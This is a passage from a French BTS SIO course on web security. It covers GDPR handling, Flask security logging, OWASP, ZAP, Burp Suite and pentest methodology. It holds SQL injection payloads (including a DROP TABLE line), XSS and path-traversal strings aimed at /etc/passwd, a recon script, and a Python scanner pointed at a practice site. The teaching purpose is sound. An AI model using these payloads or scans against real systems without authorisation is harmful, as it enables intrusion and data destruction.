  user_data = {\n            'user_id': user_id,\n            'export_date': datetime.now().isoformat(),\n            'consent_records': self.consent_records.get(user_id, []),\n            'processing_log': [\n                log for log in self.data_processing_log \n                if log['user_id'] == user_id\n            ]\n        }\n\n        # Ajouter d'autres donn\u00e9es utilisateur depuis la base\n        # user_data.update(self.get_user_profile(user_id))\n        # user_data.update(self.get_user_orders(user_id))\n\n        self.log_data_processing(user_id, 'data_exported', 'user_request')\n\n        return json.dumps(user_data, indent=2, ensure_ascii=False)\n\n    def delete_user_data(self, user_id, reason='user_request'):\n        \"\"\"Supprimer les donn\u00e9es d'un utilisateur (droit \u00e0 l'effacement)\"\"\"\n        # V\u00e9rifier si la suppression est autoris\u00e9e\n        if not self.can_delete_user_data(user_id, reason):\n            raise Exception(\"Suppression non autoris\u00e9e pour des raisons l\u00e9gales\")\n\n        # Supprimer les donn\u00e9es personnelles\n        # self.delete_user_profile(user_id)\n        # self.anonymize_user_orders(user_id)\n\n        # Conserver les logs de consentement (obligation l\u00e9gale)\n        self.log_data_processing(user_id, 'data_deleted', reason)\n\n        return True\n\n    def can_delete_user_data(self, user_id, reason):\n        \"\"\"V\u00e9rifier si les donn\u00e9es peuvent \u00eatre supprim\u00e9es\"\"\"\n        # V\u00e9rifier les obligations l\u00e9gales de conservation\n        # Par exemple, donn\u00e9es financi\u00e8res \u00e0 conserver 7 ans\n\n        # V\u00e9rifier s'il y a des litiges en cours\n        # if self.has_pending_legal_case(user_id):\n        #     return False\n\n        return True\n\n    def anonymize_expired_data(self):\n        \"\"\"Anonymiser les donn\u00e9es expir\u00e9es selon les politiques de r\u00e9tention\"\"\"\n        current_time = datetime.now()\n\n        for data_type, retention_period in self.data_retention_policies.items():\n            expiry_date = current_time - retention_period\n\n            # Identifier et anonymiser les donn\u00e9es expir\u00e9es\n            # self.anonymize_data_by_type(data_type, expiry_date)\n\n            print(f\"Donn\u00e9es {data_type} ant\u00e9rieures \u00e0 {expiry_date} anonymis\u00e9es\")\n\n    def generate_privacy_report(self, user_id):\n        \"\"\"G\u00e9n\u00e9rer un rapport de confidentialit\u00e9 pour un utilisateur\"\"\"\n        consent_history = self.consent_records.get(user_id, [])\n        processing_activities = [\n            log for log in self.data_processing_log \n            if log['user_id'] == user_id\n        ]\n\n        report = {\n            'user_id': user_id,\n            'report_date': datetime.now().isoformat(),\n            'active_consents': [\n                consent for consent in consent_history \n                if consent['consent_given']\n            ],\n            'data_processing_summary': {\n                'total_activities': len(processing_activities),\n                'last_activity': max(\n                    (log['timestamp'] for log in processing_activities), \n                    default='Aucune activit\u00e9'\n                )\n            },\n            'retention_status': self.get_retention_status(user_id)\n        }\n\n        return report\n\n    def get_retention_status(self, user_id):\n        \"\"\"Obtenir le statut de r\u00e9tention des donn\u00e9es\"\"\"\n        # Calculer quand les diff\u00e9rents types de donn\u00e9es expireront\n        current_time = datetime.now()\n\n        status = {}\n        for data_type, retention_period in self.data_retention_policies.items():\n            # En pratique, r\u00e9cup\u00e9rer la date de cr\u00e9ation des donn\u00e9es\n            # creation_date = self.get_data_creation_date(user_id, data_type)\n            # expiry_date = creation_date + retention_period\n\n            status[data_type] = {\n                'retention_period_days': retention_period.days,\n                'status': 'active'  # ou 'expired', 'anonymized'\n            }\n\n        return status\n\n# Exemple d'utilisation\ngdpr_manager = GDPRManager()\n\n# Enregistrer un consentement\ngdpr_manager.record_consent(\n    user_id='user123',\n    purpose='marketing',\n    consent_given=True,\n    ip_address='192.168.1.1'\n)\n\n# Exporter les donn\u00e9es d'un utilisateur\nuser_data_export = gdpr_manager.export_user_data('user123')\nprint(\"Donn\u00e9es export\u00e9es :\", user_data_export)\n\n# G\u00e9n\u00e9rer un rapport de confidentialit\u00e9\nprivacy_report = gdpr_manager.generate_privacy_report('user123')\nprint(\"Rapport de confidentialit\u00e9 :\", privacy_report)\n</code></pre>   ### Mise en place de logs de s\u00e9curit\u00e9   Syst\u00e8me de logging s\u00e9curis\u00e9 <pre><code>import logging\nimport json\nfrom datetime import datetime\nfrom flask import request, g\nimport hashlib\n\nclass SecurityLogger:\n    def __init__(self, log_file='security.log'):\n        self.logger = logging.getLogger('security')\n        self.logger.setLevel(logging.INFO)\n\n        # Handler pour fichier\n        file_handler = logging.FileHandler(log_file)\n        file_handler.setLevel(logging.INFO)\n\n        # Format JSON pour faciliter l'analyse\n        formatter = logging.Formatter('%(message)s')\n        file_handler.setFormatter(formatter)\n\n        self.logger.addHandler(file_handler)\n\n    def log_security_event(self, event_type, user_id=None, details=None, severity='INFO'):\n        \"\"\"Logger un \u00e9v\u00e9nement de s\u00e9curit\u00e9\"\"\"\n        event = {\n            'timestamp': datetime.now().isoformat(),\n            'event_type': event_type,\n            'severity': severity,\n            'user_id': user_id,\n            'ip_address': self.get_client_ip(),\n            'user_agent': request.headers.get('User-Agent', ''),\n            'endpoint': request.endpoint,\n            'method': request.method,\n            'details': details or {}\n        }\n\n        self.logger.info(json.dumps(event))\n\n    def get_client_ip(self):\n        \"\"\"Obtenir l'IP du client en tenant compte des proxies\"\"\"\n        if request.headers.get('X-Forwarded-For'):\n            return request.headers.get('X-Forwarded-For').split(',')[0].strip()\n        elif request.headers.get('X-Real-IP'):\n            return request.headers.get('X-Real-IP')\n        else:\n            return request.remote_addr\n\n    def log_login_attempt(self, username, success, reason=None):\n        \"\"\"Logger une tentative de connexion\"\"\"\n        self.log_security_event(\n            event_type='login_attempt',\n            user_id=username,\n            details={\n                'success': success,\n                'reason': reason\n            },\n            severity='WARNING' if not success else 'INFO'\n        )\n\n    def log_permission_denied(self, user_id, resource, action):\n        \"\"\"Logger un acc\u00e8s refus\u00e9\"\"\"\n        self.log_security_event(\n            event_type='permission_denied',\n            user_id=user_id,\n            details={\n                'resource': resource,\n                'action': action\n            },\n            severity='WARNING'\n        )\n\n    def log_suspicious_activity(self, user_id, activity_type, details):\n        \"\"\"Logger une activit\u00e9 suspecte\"\"\"\n        self.log_security_event(\n            event_type='suspicious_activity',\n            user_id=user_id,\n            details={\n                'activity_type': activity_type,\n                'details': details\n            },\n            severity='CRITICAL'\n        )\n\n# Int\u00e9gration avec Flask\nsecurity_logger = SecurityLogger()\n\n@app.before_request\ndef log_request():\n    \"\"\"Logger les requ\u00eates sensibles\"\"\"\n    sensitive_endpoints = ['login', 'admin', 'api']\n\n    if any(endpoint in request.endpoint for endpoint in sensitive_endpoints):\n        security_logger.log_security_event(\n            event_type='sensitive_endpoint_access',\n            details={'endpoint': request.endpoint}\n        )\n\n@app.after_request\ndef log_response(response):\n    \"\"\"Logger les r\u00e9ponses d'erreur\"\"\"\n    if response.status_code &gt;= 400:\n        security_logger.log_security_event(\n            event_type='error_response',\n            details={\n                'status_code': response.status_code,\n                'endpoint': request.endpoint\n            },\n            severity='WARNING' if response.status_code &lt; 500 else 'ERROR'\n        )\n\n    return response\n</code></pre>"},{"location":"BTS/B2/B3_4_Securite_applications_web/#pour-aller-plus-loin","title":"\ud83d\udcda Pour aller plus loin","text":"\ud83d\udd17 Ressources compl\u00e9mentaires : <ul> <li>OWASP Top 10 : Guide des vuln\u00e9rabilit\u00e9s web les plus critiques</li> <li>Let's Encrypt : Certificats SSL/TLS gratuits</li> <li>CNIL : Guide RGPD et protection des donn\u00e9es</li> <li>Mozilla Observatory : Test de s\u00e9curit\u00e9 des sites web</li> <li>Burp Suite : Outil de test de s\u00e9curit\u00e9 des applications web</li> </ul>"},{"location":"BTS/B2/B3_4_Securite_applications_web/#points-cles-a-retenir","title":"\u2705 Points cl\u00e9s \u00e0 retenir","text":"<ol> <li>HTTPS : Obligatoire pour prot\u00e9ger les communications</li> <li>Authentification forte : MFA, sessions s\u00e9curis\u00e9es, mots de passe robustes</li> <li>Protection XSS/CSRF : Validation, \u00e9chappement, CSP</li> <li>RGPD : Consentement, droits des utilisateurs, minimisation des donn\u00e9es</li> <li>Monitoring : Logs de s\u00e9curit\u00e9, d\u00e9tection d'incidents</li> </ol>  \ud83c\udf93 Prochaine \u00e9tape : Dans le cours B3.5, nous d\u00e9couvrirons les outils et m\u00e9thodologies de s\u00e9curit\u00e9 (OWASP, Burp Suite, tests de p\u00e9n\u00e9tration)."},{"location":"BTS/B2/B3_5_Outils_methodologies_securite/","title":"B3 5 Outils methodologies securite","text":"B3.5 - Outils et M\u00e9thodologies <p>OWASP, Burp Suite et Tests de S\u00e9curit\u00e9 - BTS SIO</p>"},{"location":"BTS/B2/B3_5_Outils_methodologies_securite/#objectifs-du-cours","title":"\ud83c\udfaf Objectifs du cours\ud83d\udee1\ufe0f OWASP (Open Web Application Security Project)\ud83d\udd0d Burp Suite\ud83c\udfaf M\u00e9thodologie de tests de p\u00e9n\u00e9tration\ud83d\udd27 Autres outils de s\u00e9curit\u00e9\ud83d\udcca Documentation et rapport","text":"<p>\u00c0 l'issue de ce cours, vous serez capable de : - Utiliser les ressources et outils OWASP pour la s\u00e9curit\u00e9 web - Ma\u00eetriser Burp Suite pour les tests de s\u00e9curit\u00e9 - Mettre en place une m\u00e9thodologie de tests de p\u00e9n\u00e9tration - Analyser et documenter les vuln\u00e9rabilit\u00e9s d\u00e9couvertes</p> OWASP  Organisation internationale \u00e0 but non lucratif d\u00e9di\u00e9e \u00e0 l'am\u00e9lioration de la s\u00e9curit\u00e9 des applications web. Elle fournit des ressources, outils et standards gratuits pour la communaut\u00e9 de la s\u00e9curit\u00e9 informatique.  Ressources principales OWASP \ud83d\udd1f OWASP Top 10  Liste des 10 vuln\u00e9rabilit\u00e9s web les plus critiques, mise \u00e0 jour tous les 3-4 ans. Guide de r\u00e9f\u00e9rence pour les d\u00e9veloppeurs et testeurs.  \ud83d\udccb ASVS  Application Security Verification Standard - Standard de v\u00e9rification de la s\u00e9curit\u00e9 des applications avec diff\u00e9rents niveaux de maturit\u00e9.  \ud83e\uddea Testing Guide  Guide complet de tests de s\u00e9curit\u00e9 des applications web avec m\u00e9thodologies et techniques d\u00e9taill\u00e9es.  \ud83d\udd27 ZAP  Zed Attack Proxy - Scanner de vuln\u00e9rabilit\u00e9s web gratuit et open source, alternative \u00e0 Burp Suite.  OWASP Top 10 - 2021 Rang Vuln\u00e9rabilit\u00e9 Impact Outils de d\u00e9tection A01 Broken Access Control Acc\u00e8s non autoris\u00e9 aux donn\u00e9es Burp Suite, ZAP, tests manuels A02 Cryptographic Failures Exposition de donn\u00e9es sensibles SSLyze, testssl.sh, Nmap A03 Injection Ex\u00e9cution de code malveillant SQLMap, Burp Suite, ZAP A04 Insecure Design Failles architecturales Revue de code, threat modeling A05 Security Misconfiguration Exposition de services Nessus, OpenVAS, Nikto A06 Vulnerable Components Exploitation de CVE connues OWASP Dependency Check A07 Authentication Failures Usurpation d'identit\u00e9 Hydra, Burp Intruder A08 Software Integrity Failures Code malveillant Analyse statique, SCA A09 Logging Failures D\u00e9tection d'incidents limit\u00e9e Audit manuel, SIEM A10 Server-Side Request Forgery Acc\u00e8s aux ressources internes Burp Suite, tests manuels Installation et utilisation d'OWASP ZAP Installation et configuration d'OWASP ZAP <pre><code># Installation sur macOS avec Homebrew\nbrew install --cask owasp-zap\n\n# Installation sur Ubuntu/Debian\nsudo apt update\nsudo apt install zaproxy\n\n# Installation via Docker\ndocker run -u zap -p 8080:8080 -p 8090:8090 \\\n  -v $(pwd):/zap/wrk/:rw \\\n  -t owasp/zap2docker-stable zap-webswing.sh\n\n# Lancement en mode daemon (API)\nzap.sh -daemon -host 0.0.0.0 -port 8080 -config api.addrs.addr.name=.* \\\n  -config api.addrs.addr.regex=true\n\n# Script Python pour automatiser ZAP\nimport time\nfrom zapv2 import ZAPv2\n\n# Configuration ZAP\nzap = ZAPv2(proxies={'http': 'http://127.0.0.1:8080', \n                     'https': 'http://127.0.0.1:8080'})\n\n# URL cible\ntarget = 'http://example.com'\n\nprint('D\u00e9marrage du scan passif...')\n# Acc\u00e9der \u00e0 l'URL cible\nzap.urlopen(target)\ntime.sleep(2)\n\nprint('D\u00e9marrage du spider...')\n# Lancer le spider pour d\u00e9couvrir les URLs\nscanid = zap.spider.scan(target)\ntime.sleep(2)\n\n# Attendre la fin du spider\nwhile int(zap.spider.status(scanid)) &lt; 100:\n    print(f'Progression spider: {zap.spider.status(scanid)}%')\n    time.sleep(5)\n\nprint('Spider termin\u00e9')\n\nprint('D\u00e9marrage du scan actif...')\n# Lancer le scan actif\nscanid = zap.ascan.scan(target)\n\n# Attendre la fin du scan\nwhile int(zap.ascan.status(scanid)) &lt; 100:\n    print(f'Progression scan: {zap.ascan.status(scanid)}%')\n    time.sleep(5)\n\nprint('Scan termin\u00e9')\n\n# R\u00e9cup\u00e9rer les alertes\nprint('Alertes trouv\u00e9es:')\nalerts = zap.core.alerts()\nfor alert in alerts:\n    print(f\"- {alert['risk']} : {alert['alert']} dans {alert['url']}\")\n\n# G\u00e9n\u00e9rer un rapport HTML\nwith open('rapport_zap.html', 'w') as f:\n    f.write(zap.core.htmlreport())\n\nprint('Rapport g\u00e9n\u00e9r\u00e9: rapport_zap.html')\n</code></pre> Burp Suite  Plateforme int\u00e9gr\u00e9e pour les tests de s\u00e9curit\u00e9 des applications web. Outil de r\u00e9f\u00e9rence utilis\u00e9 par les professionnels de la s\u00e9curit\u00e9 pour identifier et exploiter les vuln\u00e9rabilit\u00e9s web.  Composants principaux de Burp Suite \ud83d\udd04 Proxy  Intercepte et modifie le trafic HTTP/HTTPS entre le navigateur et l'application web pour analyser les requ\u00eates et r\u00e9ponses.  \ud83d\udd77\ufe0f Spider  Explore automatiquement l'application web pour d\u00e9couvrir le contenu et cartographier la surface d'attaque.  \ud83c\udfaf Scanner  Effectue des tests automatis\u00e9s pour identifier les vuln\u00e9rabilit\u00e9s courantes (injection SQL, XSS, etc.).  \ud83d\udca5 Intruder  Outil d'attaque automatis\u00e9e pour tester les param\u00e8tres avec diff\u00e9rentes charges utiles (brute force, fuzzing).  Repeater  Permet de modifier et renvoyer manuellement des requ\u00eates HTTP pour tester des vuln\u00e9rabilit\u00e9s sp\u00e9cifiques.  Sequencer  Analyse la qualit\u00e9 de la randomisation des tokens de session et autres identifiants.  Configuration et utilisation de Burp Suite Configuration initiale <ol> <li>Installation : T\u00e9l\u00e9charger depuis portswigger.net</li> <li>Proxy : Configurer le navigateur sur 127.0.0.1:8080</li> <li>Certificat : Installer le certificat CA de Burp pour HTTPS</li> <li>Scope : D\u00e9finir le p\u00e9rim\u00e8tre de test dans Target &gt; Scope</li> </ol> Fonctionnalit\u00e9s avanc\u00e9es de Burp Suite \ud83d\udd0d Proxy Intercept Intercepter et modifier les requ\u00eates en temps r\u00e9el pour tester diff\u00e9rents sc\u00e9narios d'attaque.  \ud83c\udfaf Target Sitemap Visualiser l'arborescence compl\u00e8te de l'application et identifier les endpoints sensibles.  \ud83d\udd04 Match and Replace Automatiser la modification de requ\u00eates avec des r\u00e8gles de remplacement.  \ud83d\udcca Logger Enregistrer tout le trafic HTTP pour analyse ult\u00e9rieure et g\u00e9n\u00e9ration de rapports.  \ud83d\udd0c Extensions \u00c9tendre les fonctionnalit\u00e9s avec des plugins (BApp Store) pour des tests sp\u00e9cialis\u00e9s.  Exemple pratique : Test d'injection SQL avec Burp M\u00e9thodologie de test d'injection SQL <pre><code>1. RECONNAISSANCE\n   - Identifier les param\u00e8tres d'entr\u00e9e (GET, POST, cookies, headers)\n   - Cartographier l'application avec Spider\n   - Analyser les r\u00e9ponses pour d\u00e9tecter les bases de donn\u00e9es\n\n2. D\u00c9TECTION\n   - Injecter des caract\u00e8res sp\u00e9ciaux : ' \" ; --\n   - Observer les erreurs SQL dans les r\u00e9ponses\n   - Tester les d\u00e9lais avec SLEEP() ou WAITFOR\n\n3. EXPLOITATION\n   - D\u00e9terminer le nombre de colonnes : ORDER BY 1,2,3...\n   - Identifier les colonnes affich\u00e9es : UNION SELECT 1,2,3...\n   - Extraire les donn\u00e9es : UNION SELECT user(),database(),version()\n\n4. ENUM\u00c9RATION\n   - Lister les bases de donn\u00e9es : UNION SELECT schema_name FROM information_schema.schemata\n   - Lister les tables : UNION SELECT table_name FROM information_schema.tables\n   - Lister les colonnes : UNION SELECT column_name FROM information_schema.columns\n\nExemple de payload dans Burp Intruder :\n- Position : id=\u00a71\u00a7\n- Payloads :\n  * 1' OR '1'='1\n  * 1' UNION SELECT 1,2,3--\n  * 1' AND SLEEP(5)--\n  * 1'; DROP TABLE users;--\n</code></pre> Extensions Burp Suite utiles \ud83d\udd0d SQLiPy <p>D\u00e9tection automatis\u00e9e des injections SQL avec diff\u00e9rentes techniques d'exploitation.</p> \ud83c\udfaf Autorize <p>Test automatique des contr\u00f4les d'acc\u00e8s et d\u00e9tection des vuln\u00e9rabilit\u00e9s d'autorisation.</p> \ud83d\udcca Logger++ <p>Logging avanc\u00e9 avec filtres personnalisables et export des donn\u00e9es.</p> \ud83d\udd10 JWT Editor <p>Manipulation et test des JSON Web Tokens pour identifier les failles d'authentification.</p> \ud83c\udf10 Param Miner <p>D\u00e9couverte de param\u00e8tres cach\u00e9s et d'endpoints non document\u00e9s.</p> \ud83d\udd04 Turbo Intruder <p>Attaques haute performance avec scripts Python personnalis\u00e9s.</p> Test de p\u00e9n\u00e9tration (Pentest)  \u00c9valuation de s\u00e9curit\u00e9 autoris\u00e9e qui simule une attaque r\u00e9elle pour identifier les vuln\u00e9rabilit\u00e9s exploitables dans un syst\u00e8me, une application ou un r\u00e9seau.  Phases d'un test de p\u00e9n\u00e9tration 1. \ud83d\udccb Planification et reconnaissance <ul> <li>D\u00e9finition du scope : P\u00e9rim\u00e8tre, objectifs, contraintes</li> <li>Reconnaissance passive : OSINT, DNS, r\u00e9seaux sociaux</li> <li>Reconnaissance active : Scan de ports, \u00e9num\u00e9ration de services</li> </ul> 2. \ud83d\udd0d Analyse et \u00e9num\u00e9ration <ul> <li>Cartographie : Architecture, technologies, versions</li> <li>Identification des services : Web, SSH, FTP, bases de donn\u00e9es</li> <li>Analyse des applications : Fonctionnalit\u00e9s, authentification</li> </ul> 3. \ud83c\udfaf Recherche de vuln\u00e9rabilit\u00e9s <ul> <li>Scan automatis\u00e9 : Nessus, OpenVAS, Burp Scanner</li> <li>Tests manuels : Injection, XSS, CSRF, logique m\u00e9tier</li> <li>Analyse de configuration : Permissions, chiffrement</li> </ul> 4. \ud83d\udca5 Exploitation <ul> <li>Proof of Concept : D\u00e9monstration contr\u00f4l\u00e9e</li> <li>\u00c9l\u00e9vation de privil\u00e8ges : Acc\u00e8s administrateur</li> <li>Mouvement lat\u00e9ral : Compromission d'autres syst\u00e8mes</li> </ul> 5. \ud83d\udcca Documentation et rapport <ul> <li>Classification des risques : CVSS, impact m\u00e9tier</li> <li>Recommandations : Correctifs prioritaires</li> <li>Preuves : Captures d'\u00e9cran, logs, payloads</li> </ul> Outils de reconnaissance et \u00e9num\u00e9ration Scripts de reconnaissance automatis\u00e9e <pre><code>#!/bin/bash\n# Script de reconnaissance automatis\u00e9e\n\nTARGET=$1\nOUTPUT_DIR=\"pentest_$TARGET\"\n\nif [ -z \"$TARGET\" ]; then\n    echo \"Usage: $0 &lt;target_domain&gt;\"\n    exit 1\nfi\n\nmkdir -p $OUTPUT_DIR\ncd $OUTPUT_DIR\n\necho \"[+] D\u00e9marrage de la reconnaissance pour $TARGET\"\n\n# 1. Reconnaissance DNS\necho \"[+] \u00c9num\u00e9ration DNS...\"\ndig $TARGET &gt; dns_info.txt\nnslookup $TARGET &gt;&gt; dns_info.txt\n\n# Recherche de sous-domaines\necho \"[+] Recherche de sous-domaines...\"\nsublist3r -d $TARGET -o subdomains.txt\n\n# 2. Scan de ports\necho \"[+] Scan de ports avec Nmap...\"\nnmap -sS -sV -O -A $TARGET -oA nmap_scan\n\n# Scan complet des ports\nnmap -p- --min-rate=1000 -T4 $TARGET -oA nmap_full_scan\n\n# 3. \u00c9num\u00e9ration web\necho \"[+] \u00c9num\u00e9ration des r\u00e9pertoires web...\"\nif nmap -p 80,443 $TARGET | grep -q \"open\"; then\n    # D\u00e9couverte de r\u00e9pertoires\n    dirb http://$TARGET /usr/share/dirb/wordlists/common.txt -o dirb_results.txt\n\n    # Scan avec Nikto\n    nikto -h http://$TARGET -o nikto_results.txt\n\n    # \u00c9num\u00e9ration avec gobuster\n    gobuster dir -u http://$TARGET -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o gobuster_results.txt\nfi\n\n# 4. Recherche d'informations OSINT\necho \"[+] Collecte d'informations OSINT...\"\n# theHarvester pour emails et sous-domaines\ntheHarvester -d $TARGET -l 500 -b google,bing,linkedin &gt; osint_info.txt\n\n# 5. Analyse SSL/TLS\necho \"[+] Analyse SSL/TLS...\"\nif nmap -p 443 $TARGET | grep -q \"open\"; then\n    sslscan $TARGET &gt; ssl_analysis.txt\n    testssl.sh $TARGET &gt;&gt; ssl_analysis.txt\nfi\n\necho \"[+] Reconnaissance termin\u00e9e. R\u00e9sultats dans $OUTPUT_DIR\"\n</code></pre> Framework de test d'applications web Checklist de test d'application web <pre><code>#!/usr/bin/env python3\n\"\"\"\nFramework de test de s\u00e9curit\u00e9 d'applications web\nBas\u00e9 sur OWASP Testing Guide v4\n\"\"\"\n\nimport requests\nimport re\nfrom urllib.parse import urljoin, urlparse\nimport time\n\nclass WebAppTester:\n    def __init__(self, base_url, session=None):\n        self.base_url = base_url\n        self.session = session or requests.Session()\n        self.vulnerabilities = []\n\n        # Configuration des headers\n        self.session.headers.update({\n            'User-Agent': 'WebAppTester/1.0'\n        })\n\n    def log_vulnerability(self, vuln_type, url, description, severity='Medium'):\n        \"\"\"Enregistrer une vuln\u00e9rabilit\u00e9 trouv\u00e9e\"\"\"\n        vuln = {\n            'type': vuln_type,\n            'url': url,\n            'description': description,\n            'severity': severity,\n            'timestamp': time.time()\n        }\n        self.vulnerabilities.append(vuln)\n        print(f\"[{severity}] {vuln_type} trouv\u00e9 dans {url}\")\n\n    def test_sql_injection(self, url, params):\n        \"\"\"Test d'injection SQL\"\"\"\n        sql_payloads = [\n            \"' OR '1'='1\",\n            \"' UNION SELECT 1,2,3--\",\n            \"'; DROP TABLE users;--\",\n            \"' AND SLEEP(5)--\"\n        ]\n\n        for param in params:\n            for payload in sql_payloads:\n                test_params = params.copy()\n                test_params[param] = payload\n\n                try:\n                    start_time = time.time()\n                    response = self.session.get(url, params=test_params, timeout=10)\n                    response_time = time.time() - start_time\n\n                    # D\u00e9tection par erreur SQL\n                    sql_errors = [\n                        'mysql_fetch_array',\n                        'ORA-01756',\n                        'Microsoft OLE DB Provider',\n                        'PostgreSQL query failed',\n                        'SQLite/JDBCDriver'\n                    ]\n\n                    for error in sql_errors:\n                        if error.lower() in response.text.lower():\n                            self.log_vulnerability(\n                                'SQL Injection',\n                                f\"{url}?{param}={payload}\",\n                                f\"Erreur SQL d\u00e9tect\u00e9e avec payload: {payload}\",\n                                'High'\n                            )\n\n                    # D\u00e9tection par d\u00e9lai (time-based)\n                    if 'SLEEP' in payload and response_time &gt; 4:\n                        self.log_vulnerability(\n                            'Time-based SQL Injection',\n                            f\"{url}?{param}={payload}\",\n                            f\"D\u00e9lai de {response_time:.2f}s d\u00e9tect\u00e9\",\n                            'High'\n                        )\n\n                except requests.RequestException as e:\n                    print(f\"Erreur lors du test SQL: {e}\")\n\n    def test_xss(self, url, params):\n        \"\"\"Test de Cross-Site Scripting\"\"\"\n        xss_payloads = [\n            '&lt;script&gt;alert(\"XSS\")&lt;/script&gt;',\n            '\"&gt;&lt;script&gt;alert(\"XSS\")&lt;/script&gt;',\n            \"javascript:alert('XSS')\",\n            '&lt;img src=x onerror=alert(\"XSS\")&gt;',\n            '&lt;svg onload=alert(\"XSS\")&gt;'\n        ]\n\n        for param in params:\n            for payload in xss_payloads:\n                test_params = params.copy()\n                test_params[param] = payload\n\n                try:\n                    response = self.session.get(url, params=test_params)\n\n                    # V\u00e9rifier si le payload est refl\u00e9t\u00e9 sans \u00e9chappement\n                    if payload in response.text:\n                        self.log_vulnerability(\n                            'Reflected XSS',\n                            f\"{url}?{param}={payload}\",\n                            f\"Payload XSS refl\u00e9t\u00e9: {payload}\",\n                            'High'\n                        )\n\n                except requests.RequestException as e:\n                    print(f\"Erreur lors du test XSS: {e}\")\n\n    def test_directory_traversal(self, url, params):\n        \"\"\"Test de Directory Traversal\"\"\"\n        traversal_payloads = [\n            '../../../etc/passwd',\n            '..\\\\..\\\\..\\\\windows\\\\system32\\\\drivers\\\\etc\\\\hosts',\n            '....//....//....//etc/passwd',\n            '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd'\n        ]\n\n        for param in params:\n            for payload in traversal_payloads:\n                test_params = params.copy()\n                test_params[param] = payload\n\n                try:\n                    response = self.session.get(url, params=test_params)\n\n                    # Rechercher des signatures de fichiers syst\u00e8me\n                    if re.search(r'root:.*:0:0:', response.text) or \\\n                       'localhost' in response.text.lower():\n                        self.log_vulnerability(\n                            'Directory Traversal',\n                            f\"{url}?{param}={payload}\",\n                            f\"Acc\u00e8s \u00e0 des fichiers syst\u00e8me d\u00e9tect\u00e9\",\n                            'High'\n                        )\n\n                except requests.RequestException as e:\n                    print(f\"Erreur lors du test Directory Traversal: {e}\")\n\n    def test_security_headers(self, url):\n        \"\"\"V\u00e9rifier les en-t\u00eates de s\u00e9curit\u00e9\"\"\"\n        try:\n            response = self.session.get(url)\n            headers = response.headers\n\n            security_headers = {\n                'X-Frame-Options': 'Protection contre le clickjacking',\n                'X-XSS-Protection': 'Protection XSS du navigateur',\n                'X-Content-Type-Options': 'Protection contre le MIME sniffing',\n                'Strict-Transport-Security': 'Forcer HTTPS',\n                'Content-Security-Policy': 'Politique de s\u00e9curit\u00e9 du contenu'\n            }\n\n            for header, description in security_headers.items():\n                if header not in headers:\n                    self.log_vulnerability(\n                        'Missing Security Header',\n                        url,\n                        f\"En-t\u00eate manquant: {header} - {description}\",\n                        'Low'\n                    )\n\n        except requests.RequestException as e:\n            print(f\"Erreur lors du test des en-t\u00eates: {e}\")\n\n    def run_full_test(self, test_urls):\n        \"\"\"Ex\u00e9cuter tous les tests\"\"\"\n        print(f\"[+] D\u00e9marrage des tests sur {self.base_url}\")\n\n        for url_path, params in test_urls.items():\n            full_url = urljoin(self.base_url, url_path)\n            print(f\"[+] Test de {full_url}\")\n\n            # Tests de vuln\u00e9rabilit\u00e9s\n            self.test_sql_injection(full_url, params)\n            self.test_xss(full_url, params)\n            self.test_directory_traversal(full_url, params)\n            self.test_security_headers(full_url)\n\n        # Rapport final\n        self.generate_report()\n\n    def generate_report(self):\n        \"\"\"G\u00e9n\u00e9rer un rapport des vuln\u00e9rabilit\u00e9s\"\"\"\n        print(\"\\n\" + \"=\"*50)\n        print(\"RAPPORT DE S\u00c9CURIT\u00c9\")\n        print(\"=\"*50)\n\n        if not self.vulnerabilities:\n            print(\"Aucune vuln\u00e9rabilit\u00e9 d\u00e9tect\u00e9e.\")\n            return\n\n        # Grouper par s\u00e9v\u00e9rit\u00e9\n        by_severity = {}\n        for vuln in self.vulnerabilities:\n            severity = vuln['severity']\n            if severity not in by_severity:\n                by_severity[severity] = []\n            by_severity[severity].append(vuln)\n\n        # Afficher par ordre de s\u00e9v\u00e9rit\u00e9\n        for severity in ['Critical', 'High', 'Medium', 'Low']:\n            if severity in by_severity:\n                print(f\"\\n{severity.upper()} ({len(by_severity[severity])} vuln\u00e9rabilit\u00e9s):\")\n                for vuln in by_severity[severity]:\n                    print(f\"  - {vuln['type']}: {vuln['description']}\")\n                    print(f\"    URL: {vuln['url']}\")\n\n# Exemple d'utilisation\nif __name__ == \"__main__\":\n    # Configuration des tests\n    target_url = \"http://testphp.vulnweb.com\"\n\n    test_endpoints = {\n        \"/artists.php\": {\"artist\": \"1\"},\n        \"/search.php\": {\"searchFor\": \"test\"},\n        \"/login.php\": {\"uname\": \"admin\", \"pass\": \"password\"}\n    }\n\n    # Lancement des tests\n    tester = WebAppTester(target_url)\n    tester.run_full_test(test_endpoints)\n</code></pre> Outils de scan de vuln\u00e9rabilit\u00e9s \ud83d\udd0d Nessus  Scanner de vuln\u00e9rabilit\u00e9s commercial avec une large base de plugins pour d\u00e9tecter les failles de s\u00e9curit\u00e9.  \ud83c\udd93 OpenVAS  Alternative open source \u00e0 Nessus, scanner complet avec interface web et rapports d\u00e9taill\u00e9s.  \ud83c\udf10 Nikto  Scanner web sp\u00e9cialis\u00e9 dans la d\u00e9tection de vuln\u00e9rabilit\u00e9s et configurations dangereuses des serveurs web.  \ud83d\uddc2\ufe0f DirBuster  Outil de d\u00e9couverte de r\u00e9pertoires et fichiers cach\u00e9s sur les serveurs web par force brute.  Outils d'analyse de code \ud83d\udd0d SonarQube <p>Analyse statique de code pour d\u00e9tecter les vuln\u00e9rabilit\u00e9s, bugs et code smells.</p> \ud83d\udee1\ufe0f Bandit <p>Scanner de s\u00e9curit\u00e9 sp\u00e9cialis\u00e9 pour le code Python, d\u00e9tecte les pratiques dangereuses.</p> \ud83d\udce6 OWASP Dependency Check <p>Analyse les d\u00e9pendances pour identifier les composants avec des vuln\u00e9rabilit\u00e9s connues.</p> \ud83d\udd10 Semgrep <p>Outil d'analyse statique multi-langages avec r\u00e8gles de s\u00e9curit\u00e9 personnalisables.</p> Installation et utilisation d'outils de s\u00e9curit\u00e9 Installation et configuration d'outils essentiels <pre><code>#!/bin/bash\n# Script d'installation d'outils de s\u00e9curit\u00e9\n\necho \"[+] Installation des outils de s\u00e9curit\u00e9...\"\n\n# Mise \u00e0 jour du syst\u00e8me\nsudo apt update &amp;&amp; sudo apt upgrade -y\n\n# Outils de base\nsudo apt install -y nmap nikto dirb gobuster hydra john sqlmap\n\n# Installation de Burp Suite Community\nwget -O burpsuite.sh \"https://portswigger.net/burp/releases/download?product=community&amp;type=Linux\"\nchmod 